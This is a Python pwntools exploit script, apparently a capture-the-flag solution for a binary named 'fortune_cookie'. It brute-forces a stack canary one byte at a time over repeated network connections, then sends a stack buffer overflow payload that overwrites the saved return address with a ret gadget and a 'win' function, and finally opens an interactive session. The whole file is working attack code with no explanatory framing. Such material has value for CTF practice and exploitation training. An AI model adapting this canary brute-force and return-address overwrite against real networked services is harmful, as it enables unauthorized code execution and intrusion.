#!/usr/bin/env python3
from pwn import *

exe = ELF('./fortune_cookie')
context.binary = exe
context.arch   = 'amd64'
context.os     = 'linux'

HOSTNAME = 'HOSTNAME_PLACEHOLDER'
PORT     = 0  # PORT_PLACEHOLDER

# ── offsets ───────────────────────────────────────────────────────────────────
OFFSET_TO_CANARY = 72
OFFSET_TO_RIP    = 88   # canary (8) + saved RBP (8)

# ── gadgets ───────────────────────────────────────────────────────────────────
GADGET = 0x0000000000401530   # ret — stack alignment

def conn(interactive=False):
    level = 'info' if interactive else 'error'
    if args.LOCAL:
        return remote('127.0.0.1', 4444, level=level)
    return remote(HOSTNAME, PORT, level=level)


def try_byte(known, bval):
    r = conn()
    try:
        r.recvuntil(b"wish\n")
        payload = b"A" * OFFSET_TO_CANARY + known + bytes([bval])
        r.send(payload)
        response = r.recv(timeout=0.2)
        return b'OK' in response
    except Exception:
        return False
    finally:
        r.close()


def main():
    # ── leak phase (canary brute-force) ───────────────────────────────────────
    known = b"\x00"

    for i in range(7):
        p = log.progress(f'Bruteforcing byte {i+1}')
        for bval in range(256):
            p.status(f'Trying byte: {bval:#04x}')
            if try_byte(known, bval):
                known += bytes([bval])
                p.success(f"Found: {bval:#04x}, canary so far: {known.hex()}")
                break
        else:
            p.failure(f'Failed to find byte {i+1}')
            return

    canary = u64(known)
    log.success(f"canary = {canary:#x}")

    # ── exploit phase ─────────────────────────────────────────────────────────
    r = conn(interactive=True)
    r.recvuntil(b"wish\n")
    payload = flat(
        b"A" * OFFSET_TO_CANARY,
        p64(canary),
        b"B" * (OFFSET_TO_RIP - OFFSET_TO_CANARY - 8),   # overwrite saved RBP
        p64(GADGET),
        p64(exe.sym.win),
    )
    r.send(payload)
    r.interactive()

if __name__ == '__main__':
    main()
